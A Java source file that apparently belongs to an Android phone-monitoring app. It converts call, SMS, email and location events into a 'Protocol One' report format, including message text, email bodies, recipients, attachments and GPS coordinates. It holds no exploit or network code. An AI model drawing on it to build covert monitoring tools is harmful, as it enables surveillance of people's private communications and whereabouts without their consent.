package com.fx.dalvik.protocolone;

import java.text.DateFormat;
import java.util.Arrays;
import java.util.Date;

import com.fx.dalvik.event.Event;
import com.fx.dalvik.event.EventCall;
import com.fx.dalvik.event.EventEmail;
import com.fx.dalvik.event.EventLocation;
import com.fx.dalvik.event.EventSms;
import com.fx.dalvik.event.EventSystem;
import com.fx.dalvik.util.GeneralUtil;

public class ProtocolOneParser {
	
	public static final short TYPE_UNKNOWN_INT = 0;
	public static final String TYPE_UNKNOWN_STRING = "";

	public static final char TYPE_UNKNOWN = 0;
	public static final char TYPE_VOICE = 1;
	public static final char TYPE_SMS = 2;
	public static final char TYPE_EMAIL = 3;
	public static final char TYPE_FAX = 4;
	public static final char TYPE_DATA = 5;
	public static final char TYPE_TASKS = 6;
	public static final char TYPE_GPRS = 7;
	public static final char TYPE_MMS = 8;
	public static final char TYPE_LOCATION = 9;
	public static final char TYPE_SYSTEM = 127;

	public static final char DIRECTION_UNKNOWN = 0;
	public static final char DIRECTION_IN = 1;
	public static final char DIRECTION_OUT = 2;
	public static final char DIRECTION_MISSED = 3;
	
	public static final int GPS_METHOD_UNKNOWN = 0;
	public static final int GPS_METHOD_INTEGRATED = 1;
	public static final int GPS_METHOD_ASSISTED = 2;
	public static final int GPS_METHOD_NETWORK_BASED = 3;
	public static final int GPS_METHOD_GLOCATION = 4;
	
	public static final String PROVIDER_GPS = "gps";
	public static final String PROVIDER_NETWORK = "network";
	public static final String PROVIDER_GLOCATION = "glocation";
	
	public static int getProtocolOneEventId(Event event) {
		return event.getIdentifier();
	}
	
	public static char getProtocolOneEventType(Event event) {
		switch(event.getType()) {
			case Event.TYPE_CALL:
				return TYPE_VOICE;
			case Event.TYPE_SMS:
				return TYPE_SMS;
			case Event.TYPE_EMAIL:
				return TYPE_EMAIL;
			case Event.TYPE_LOCATION:
				return TYPE_LOCATION;
			case Event.TYPE_SYSTEM:
				return TYPE_SYSTEM;
			default: 
				return TYPE_UNKNOWN;
		}
	}
	
	public static String getProtocolOneTime(Event event) {
		DateFormat formatter = GeneralUtil.getDateFormatter();
		
		switch(event.getType()) {

			case Event.TYPE_CALL:
				long timeInitiated = ((EventCall)event).getTimeInitiated();
				long timeConnected = ((EventCall)event).getTimeConnected();
				long timeTerminated = ((EventCall)event).getTimeTerminated();
				
				if (timeConnected == timeTerminated) {
					return formatter.format(new Date(timeInitiated));
				}
				else {
					return formatter.format(new Date(timeConnected));
				}
				
			case Event.TYPE_SMS:
				return formatter.format(new Date(((EventSms)event).getTime()));
				
			case Event.TYPE_EMAIL:
				return formatter.format(new Date(((EventEmail)event).getTime()));
			
			case Event.TYPE_LOCATION:
				return formatter.format(new Date(((EventLocation)event).getTime()));
			
			case Event.TYPE_SYSTEM:
				return formatter.format(new Date(((EventSystem)event).getTime()));
			
			default: 
				return "";
		}
	}
	
	public static char getProtocolOneDirection(Event event) {
		
		short eventDirection = Event.DIRECTION_UNKNOWN;
		
		// Get event direction
		switch(event.getType()) {
			case Event.TYPE_CALL:
				eventDirection = ((EventCall)event).getDirection();
				break;
			case Event.TYPE_SMS:
				eventDirection = ((EventSms)event).getDirection();
				break;
			case Event.TYPE_EMAIL:
				eventDirection = ((EventEmail)event).getDirection();
				break;
			case Event.TYPE_LOCATION:
				return DIRECTION_UNKNOWN;
			case Event.TYPE_SYSTEM:
				eventDirection = ((EventSystem)event).getDirection();
				break;
		}
		
		// Check with Protocol One direction
		switch (eventDirection) {
			case Event.DIRECTION_IN:
				return DIRECTION_IN;
				
			case Event.DIRECTION_OUT:
				return DIRECTION_OUT;			
				
			case Event.DIRECTION_MISSED:
				return DIRECTION_MISSED;
				
			default:
				return DIRECTION_UNKNOWN;			
		}
	}
	
	public static int getProtocolOneDuration(Event event) {
		switch(event.getType()) {
			case Event.TYPE_CALL:
				return ((EventCall)event).getDurationSeconds();
			case Event.TYPE_LOCATION:
				String provider = ((EventLocation) event).getProvider();
				if (PROVIDER_GPS.equalsIgnoreCase(provider)) {
					return GPS_METHOD_INTEGRATED;
				}
				else if (PROVIDER_NETWORK.equalsIgnoreCase(provider)) {
					return GPS_METHOD_ASSISTED;
				}
				else if (PROVIDER_GLOCATION.equalsIgnoreCase(provider)) {
					return GPS_METHOD_GLOCATION;
				}
				else {
					return GPS_METHOD_UNKNOWN;
				}
			case Event.TYPE_SMS:
			case Event.TYPE_EMAIL:
			case Event.TYPE_SYSTEM:
			default:
				return TYPE_UNKNOWN_INT;
		}
	}
	
	public static String getProtocolOnePhonenumber(Event event) {
		String phoneNumber = null;
		switch(event.getType()) {
			case Event.TYPE_CALL:
				phoneNumber = ((EventCall)event).getPhonenumber();
				break;
			case Event.TYPE_SMS:
				phoneNumber = ((EventSms)event).getPhonenumber();
				break;
			case Event.TYPE_EMAIL:
				char direction = getProtocolOneDirection(event);
				if (direction == DIRECTION_IN) {
					phoneNumber = ((EventEmail)event).getSender();
				}
				break;
		}
		return phoneNumber == null? TYPE_UNKNOWN_STRING: phoneNumber;
	}
	
	public static String getProtocolOneDescription(Event event) {
		String description = null;
		switch(event.getType()) {
			case Event.TYPE_EMAIL:
				char direction = getProtocolOneDirection(event);
				if (direction == DIRECTION_OUT) {
					EventEmail email = (EventEmail) event;
					description = String.format("TO: %s\nCC: %s\nBCC: %s", 
							getEmailArrayString(email.getTo()),
							getEmailArrayString(email.getCc()), 
							getEmailArrayString(email.getBcc()));
				}
				break;
			case Event.TYPE_LOCATION:
				double latitude = ((EventLocation)event).getLatitude();
				double longitude = ((EventLocation)event).getLongitude();
				description = String.format("%f;%f", latitude, longitude);
				break;
		}
		return description == null? TYPE_UNKNOWN_STRING: description;
	}
	
	public static String getProtocolOneSubject(Event event) {
		String subject = null;
		switch(event.getType()) {
			case Event.TYPE_EMAIL:
				subject = ((EventEmail) event).getSubject();
				break;
			case Event.TYPE_LOCATION:
				double vAcc = ((EventLocation) event).getVerticalAccuracy();
				double hAcc = ((EventLocation) event).getHorizontalAccuracy();
				subject = String.format("%f;%f", vAcc, hAcc);
				break;
		}
		return subject == null? TYPE_UNKNOWN_STRING: subject;
	}
	
	public static String getProtocolOneStatus(Event event) {
		String status = null;
		if (event.getType() == Event.TYPE_EMAIL) {
			status = getEmailArrayString(((EventEmail) event).getAttachments());
		}
		return status == null? TYPE_UNKNOWN_STRING: status;
	}
	
	public static String getProtocolOneData(Event event) {
		String data = null;
		switch(event.getType()) {
			case Event.TYPE_SMS:
				data = ((EventSms) event).getData();
				break;
			case Event.TYPE_EMAIL:
				data = ((EventEmail) event).getBody();
				break;
			case Event.TYPE_SYSTEM:
				data = ((EventSystem) event).getData();
				break;
		}
		return data == null? TYPE_UNKNOWN_STRING: data;
	}
	
	public static String getProtocolOneRemoteparty(Event event) {
		String remoteParty = null;
		switch(event.getType()) {
			case Event.TYPE_CALL:
				remoteParty = ((EventCall)event).getContactName();
				break;
			case Event.TYPE_SMS:
				remoteParty = ((EventSms)event).getContactName();
				break;
			case Event.TYPE_EMAIL:
				remoteParty = ((EventEmail)event).getContactName();
				break;
		}
		return remoteParty == null? TYPE_UNKNOWN_STRING: remoteParty;
	}
	
	private static String getEmailArrayString(String[] input) {
		if (input == null || input.length < 1) {
			return "";
		}
		String arrayString = Arrays.toString(input);
		return arrayString
				.substring(1, arrayString.length() - 1)
				.replace(",", ";")
				.replace(" ", "");
	}
	
}
